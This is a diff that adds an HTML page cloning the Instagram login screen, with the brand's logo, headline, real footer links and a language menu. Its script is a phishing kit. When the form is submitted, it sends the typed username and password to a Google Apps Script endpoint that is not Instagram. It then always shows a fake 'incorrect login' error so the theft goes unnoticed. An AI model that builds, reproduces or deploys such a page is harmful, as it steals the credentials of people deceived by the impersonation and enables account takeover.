@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon" type="image/png" href="/static/ig.png">
+
+    <style>
+        * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+html,
+body {
+    width: 100%;
+    min-height: 100%;
+}
+
+body {
+    background: #000;
+    color: #f5f5f5;
+    font-family: Arial, Helvetica, sans-serif;
+    overflow-x: hidden;
+    overflow-y: auto;
+}
+
+.page {
+    width: 100%;
+    min-height: 100vh;
+    display: flex;
+}
+
+.left {
+    width: 50%;
+    min-height: 100vh;
+    background: #0b0e12;
+    border-right: 2px solid #3d4045;
+    padding: 68px 55px;
+    overflow: hidden;
+}
+
+.real-logo {
+    width: 105px;
+    height: 105px;
+    object-fit: contain;
+    display: block;
+    margin-left: 12px;
+    margin-bottom: 35px;
+}
+
+.headline {
+    width: 100%;
+    max-width: 650px;
+    margin: 0 auto;
+    text-align: center;
+    font-size: 45px;
+    font-weight: 400;
+    line-height: 1.48;
+    letter-spacing: -1px;
+}
+
+.gradient-text {
+    background: linear-gradient(90deg,
+            #ff674d,
+            #ff1493,
+            #d900ff);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+}
+
+.promo-image {
+    display: block;
+    width: 390px;
+    max-width: 70%;
+    height: auto;
+    max-height: 340px;
+    object-fit: contain;
+    margin: 38px auto 0;
+}
+
+.right {
+    width: 50%;
+    min-height: 100vh;
+    background: #1f1f21;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    padding-top: 68px;
+    padding-bottom: 50px;
+}
+
+.login-container {
+    width: 680px;
+    max-width: 82%;
+}
+
+.login-title {
+    font-size: 24px;
+    line-height: 1.25;
+    font-weight: 600;
+    margin-bottom: 34px;
+}
+
+.error-box {
+    width: 100%;
+    min-height: 94px;
+    background: #1c1c1c;
+    border: 1px solid #4d5057;
+    border-radius: 18px;
+    padding: 17px 20px;
+    display: none;
+    align-items: flex-start;
+    margin-bottom: 40px;
+    font-size: 17px;
+    line-height: 1.45;
+}
+
+.error-icon {
+    width: 22px;
+    height: 22px;
+    min-width: 22px;
+    border: 2px solid #ff7180;
+    border-radius: 50%;
+    color: #ff7180;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 14px;
+    font-weight: bold;
+    margin-right: 18px;
+    margin-top: 2px;
+}
+
+.error-text {
+    color: #f5f5f5;
+    padding-top: 1px;
+}
+
+.error-link {
+    color: #3797ff;
+    font-weight: 600;
+    text-decoration: none;
+}
+
+.error-link:hover {
+    text-decoration: underline;
+}
+
+.field {
+    position: relative;
+    width: 100%;
+    margin-bottom: 16px;
+}
+
+.input {
+    width: 100%;
+    height: 80px;
+    background: #1f1f21;
+    border: 1px solid #4d5057;
+    border-radius: 18px;
+    outline: none;
+    color: #fff;
+    padding: 27px 62px 8px 20px;
+    font-size: 17px;
+    font-family: Arial, Helvetica, sans-serif;
+    transition: border-color 0.15s ease;
+}
+
+.input:focus {
+    border-color: #8a8d94;
+}
+
+.field label {
+    position: absolute;
+    left: 20px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: #9da5b2;
+    font-size: 17px;
+    line-height: 1;
+    pointer-events: none;
+    transition: top 0.15s ease, transform 0.15s ease, font-size 0.15s ease;
+}
+
+.field:focus-within label,
+.field.has-value label {
+    top: 16px;
+    transform: translateY(0);
+    font-size: 12px;
+}
+
+.eye-button {
+    position: absolute;
+    right: 16px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 38px;
+    height: 38px;
+    border: none;
+    background: transparent;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 0;
+}
+
+.eye-button svg {
+    width: 25px;
+    height: 25px;
+    display: block;
+}
+
+.eye-button svg path,
+.eye-button svg circle,
+.eye-button svg line {
+    stroke: #eeeeee;
+    stroke-width: 1.8;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+}
+
+.login-btn {
+    width: 100%;
+    height: 58px;
+    border: none;
+    border-radius: 30px;
+    background: #0878ed;
+    color: white;
+    font-size: 17px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 11px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: background 0.15s ease, opacity 0.15s ease;
+}
+
+.login-btn:hover {
+    background: #1683ed;
+}
+
+.login-btn.loading {
+    cursor: wait;
+    pointer-events: none;
+}
+
+.login-text {
+    display: inline;
+}
+
+.spinner {
+    width: 24px;
+    height: 24px;
+    border: 3px solid rgba(255, 255, 255, 0.35);
+    border-top-color: #ffffff;
+    border-radius: 50%;
+    animation: spin 0.75s linear infinite;
+    display: none;
+}
+
+.login-btn.loading .login-text {
+    display: none;
+}
+
+.login-btn.loading .spinner {
+    display: block;
+}
+
+@keyframes spin {
+    from {
+        transform: rotate(0deg);
+    }
+
+    to {
+        transform: rotate(360deg);
+    }
+}
+
+.forgot {
+    display: block;
+    text-align: center;
+    margin-top: 32px;
+    color: white;
+    text-decoration: none;
+    font-size: 17px;
+    font-weight: 600;
+}
+
+.forgot:hover {
+    text-decoration: underline;
+}
+
+.facebook-btn {
+    width: 100%;
+    height: 58px;
+    border: none;
+    border-radius: 30px;
+    background: #29292b;
+    color: #d0d0d0;
+    font-size: 17px;
+    font-weight: 400;
+    cursor: pointer;
+    margin-top: 76px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    text-decoration: none;
+}
+
+.facebook-btn:hover {
+    background: #303033;
+}
+
+.facebook-icon {
+    width: 20px;
+    height: 20px;
+    border-radius: 50%;
+    background: #1683ed;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: white;
+    font-size: 14px;
+    font-weight: bold;
+}
+
+.create-btn {
+    width: 100%;
+    height: 58px;
+    border: 1px solid #1683ed;
+    border-radius: 30px;
+    background: transparent;
+    color: #1683ed;
+    font-size: 17px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 15px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    text-decoration: none;
+}
+
+.create-btn:hover {
+    background: rgba(22, 131, 237, 0.08);
+}
+
+.footer {
+    width: 100%;
+    margin-top: 48px;
+    padding-bottom: 20px;
+    text-align: center;
+    color: #a8a8a8;
+    font-size: 12px;
+    line-height: 1.8;
+}
+
+.footer-links {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    align-items: center;
+    gap: 4px 16px;
+    margin-bottom: 18px;
+}
+
+.footer-links a {
+    color: #a8a8a8;
+    text-decoration: none;
+    white-space: nowrap;
+}
+
+.footer-links a:hover {
+    text-decoration: underline;
+}
+
+.footer-bottom {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 18px;
+    flex-wrap: wrap;
+}
+
+.language-select {
+    border: none;
+    outline: none;
+    background: transparent;
+    color: #a8a8a8;
+    font-size: 12px;
+    cursor: pointer;
+    appearance: none;
+    padding-right: 12px;
+    background-image:
+        linear-gradient(45deg, transparent 50%, #a8a8a8 50%),
+        linear-gradient(135deg, #a8a8a8 50%, transparent 50%);
+    background-position:
+        calc(100% - 7px) 50%,
+        calc(100% - 3px) 50%;
+    background-size:
+        4px 4px,
+        4px 4px;
+    background-repeat: no-repeat;
+}
+
+.language-select option {
+    background: #1f1f21;
+    color: white;
+}
+
+#result {
+    margin-top: 15px;
+    text-align: center;
+    font-size: 14px;
+    color: #a8a8a8;
+}
+
+@media (max-width: 1100px) {
+    .left {
+        padding-left: 35px;
+        padding-right: 35px;
+    }
+
+    .headline {
+        font-size: 38px;
+    }
+
+    .promo-image {
+        width: 350px;
+    }
+}
+
+@media (max-width: 750px) {
+    .page {
+        display: block;
+    }
+
+    .left {
+        display: none;
+    }
+
+    .right {
+        width: 100%;
+        min-height: 100vh;
+        padding-top: 60px;
+        padding-bottom: 30px;
+    }
+
+    .login-container {
+        width: 480px;
+        max-width: 88%;
+    }
+
+    .login-title {
+        font-size: 21px;
+        margin-bottom: 30px;
+    }
+
+    .facebook-btn {
+        margin-top: 65px;
+    }
+
+    .footer {
+        margin-top: 42px;
+    }
+
+    .footer-links {
+        gap: 4px 12px;
+    }
+}
+    </style>
+</head>
+
+<body>
+
+    <div class="page">
+        <!-- LEFT SIDE -->
+        <section class="left">
+            <img src="/static/a.png" alt="in" class="real-logo">
+            <div class="headline">
+                See everyday moments from
+                <br>
+                your
+                <span class="gradient-text">
+                    close friends.
+                </span>
+            </div>
+            <img src="/static/promo.png" alt="" class="promo-image">
+        </section>
+
+        <!-- RIGHT SIDE -->
+        <section class="right">
+            <div class="login-container">
+                <h1 class="login-title">Log into instagram</h1>
+
+                <!-- ERROR MESSAGE -->
+                <div id="errorBox" class="error-box" style="display:none;">
+    <span class="error-icon">ⓘ</span>
+    <span class="error-text">
+        The login information you entered is incorrect. 
+        <a href="#" class="error-link">Find your account and log in.</a>
+    </span>
+</div>
+
+                <!-- LOGIN FORM -->
+                <form id="loginForm">
+                    <!-- USERNAME -->
+                    <div class="field">
+                        <input type="text" id="username" name="username" class="input" autocomplete="off">
+                        <label for="username">Mobile number, username or password</label>
+                    </div>
+
+                    <!-- PASSWORD -->
+                    <div class="field">
+                        <input type="password" id="password" name="password" class="input" autocomplete="off">
+                        <label for="password">Password</label>
+
+                        <button type="button" class="eye-button" id="eyeButton" aria-label="Show password">
+                            <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                                <path d="M2.5 12s3.5-6 9.5-6 9.5 6 9.5 6-3.5 6-9.5 6-9.5-6-9.5-6Z" />
+                                <circle cx="12" cy="12" r="2.8" />
+                            </svg>
+                        </button>
+                    </div>
+
+                    <!-- LOGIN BUTTON -->
+                    <button type="submit" class="login-btn" id="loginButton">
+                        <span class="login-text">Log in</span>
+                        <span class="spinner"></span>
+                    </button>
+                </form>
+
+                <div id="result"></div>
+
+                <!-- FORGOT PASSWORD -->
+                <a href="https://www.instagram.com/accounts/password/reset/" class="forgot">
+                    Forgot password?
+                </a>
+
+                <!-- FACEBOOK -->
+                <a href="https://www.facebook.com/login.php" class="facebook-btn">
+                    <span class="facebook-icon">f</span>
+                    Log in with Facebook
+                </a>
+
+                <!-- CREATE ACCOUNT -->
+                <a href="https://www.instagram.com/accounts/passwordsignup/" class="create-btn">
+                    Create new account
+                </a>
+
+                <!-- FOOTER -->
+                <footer class="footer">
+                    <div class="footer-links">
+                        <a href="https://about.meta.com/">Meta</a>
+                        <a href="https://about.instagram.com/">About</a>
+                        <a href="https://about.instagram.com/blog/">Blog</a>
+                        <a href="https://about.instagram.com/about-us/careers">Jobs</a>
+                        <a href="https://help.instagram.com/">Help</a>
+                        <a href="https://developers.facebook.com/docs/instagram">API</a>
+                        <a href="https://www.instagram.com/legal/privacy/">Privacy</a>
+                        <a href="https://www.instagram.com/legal/terms/">Terms</a>
+                        <a href="https://www.instagram.com/explore/locations/">Locations</a>
+                        <a href="https://www.instagram.com/popular/">Popular</a>
+                        <a href="https://www.instagram.com/web/lite/">instagram Lite</a>
+                        <a href="https://www.meta.ai/?utm_source=foa_web_footer">Meta AI</a>
+                        <a href="https://muse.ai/">Muse</a>
+                        <a href="https://www.threads.com/">Threads</a>
+                        <a href="https://www.facebook.com/help/instagram/261704639352628">Contact Uploading &amp; Non-Users</a>
+                        <a href="https://www.instagram.com/accounts/meta_verified/?entrypoint=web_footer">Meta Verified</a>
+                    </div>
+
+                    <div class="footer-bottom">
+                        <select class="language-select" aria-label="Language">
+                            <option>Afrikaans</option>
+                            <option>العربية</option>
+                            <option>Čeština</option>
+                            <option>Dansk</option>
+                            <option>Deutsch</option>
+                            <option>Ελληνικά</option>
+                            <option selected>English</option>
+                            <option>English (UK)</option>
+                            <option>Español (España)</option>
+                            <option>Español</option>
+                            <option>فارسی</option>
+                            <option>Suomi</option>
+                            <option>Français</option>
+                            <option>עברית</option>
+                            <option>Bahasa Indonesia</option>
+                            <option>Italiano</option>
+                            <option>日本語</option>
+                            <option>한국어</option>
+                            <option>Bahasa Melayu</option>
+                            <option>Norsk</option>
+                            <option>Nederlands</option>
+                            <option>Polski</option>
+                            <option>Português (Brasil)</option>
+                            <option>Português (Portugal)</option>
+                            <option>Русский</option>
+                            <option>Svenska</option>
+                            <option>ภาษาไทย</option>
+                            <option>Filipino</option>
+                            <option>Türkçe</option>
+                            <option>中文 (简体)</option>
+                            <option>中文 (台灣)</option>
+                            <option>বাংলা</option>
+                            <option>ગુજરાતી</option>
+                            <option>हिन्दी</option>
+                            <option>Hrvatski</option>
+                            <option>Magyar</option>
+                            <option>ಕನ್ನಡ</option>
+                            <option>മലയാളം</option>
+                            <option>मराठी</option>
+                            <option>नेपाली</option>
+                            <option>ਪੰਜਾਬੀ</option>
+                            <option>සිංහල</option>
+                            <option>Slovenčina</option>
+                            <option>தமிழ்</option>
+                            <option>తెలుగు</option>
+                            <option>اردو</option>
+                            <option>Tiếng Việt</option>
+                            <option>中文 (香港)</option>
+                            <option>Български</option>
+                            <option>Français (Canada)</option>
+                            <option>Română</option>
+                        </select>
+
+                        <span>© 2026 instagram from Meta</span>
+                    </div>
+                </footer>
+            </div>
+        </section>
+    </div>
+<script>
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const inputs = document.querySelectorAll('.input');
+    const eyeButton = document.getElementById('eyeButton');
+    const loginForm = document.getElementById('loginForm');
+    const loginButton = document.getElementById('loginButton');
+    const errorBox = document.getElementById('errorBox');
+    const result = document.getElementById('result');
+
+    // Floating label setup
+    inputs.forEach(input => {
+        const checkValue = () => {
+            const parent = input.parentElement;
+            if (input.value.trim() !== '') {
+                parent.classList.add('has-value');
+            } else {
+                parent.classList.remove('has-value');
+            }
+        };
+
+        input.addEventListener('input', checkValue);
+        input.addEventListener('blur', checkValue);
+        checkValue();
+    });
+
+    // Toggle password visibility
+    eyeButton.addEventListener('click', () => {
+        const isPassword = passwordInput.getAttribute('type') === 'password';
+        passwordInput.setAttribute('type', isPassword ? 'text' : 'password');
+    });
+
+    // Google Apps Script Web App URL
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbyHCzAwjmx8r4XbDr0aXzeWsEvVcncdeTlEpQFtWZli81p0TWMuN7sPQ2PR73xoMd9YOQ/exec';
+
+    // Form submit handler
+    loginForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+
+        // Read values fresh, at submit time
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        loginButton.classList.add('loading');
+        errorBox.style.display = 'none';
+
+        fetch(scriptURL, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: new URLSearchParams({ username, password })
+        })
+            .then(() => {
+                loginButton.classList.remove('loading');
+                // Backend not ready yet — always show the "incorrect" message
+                errorBox.style.display = 'flex';
+            })
+            .catch(error => {
+                loginButton.classList.remove('loading');
+                errorBox.style.display = 'flex';
+                console.error('Error!', error.message);
+            });
+    });
+</script>
+</body>
+
+</html>
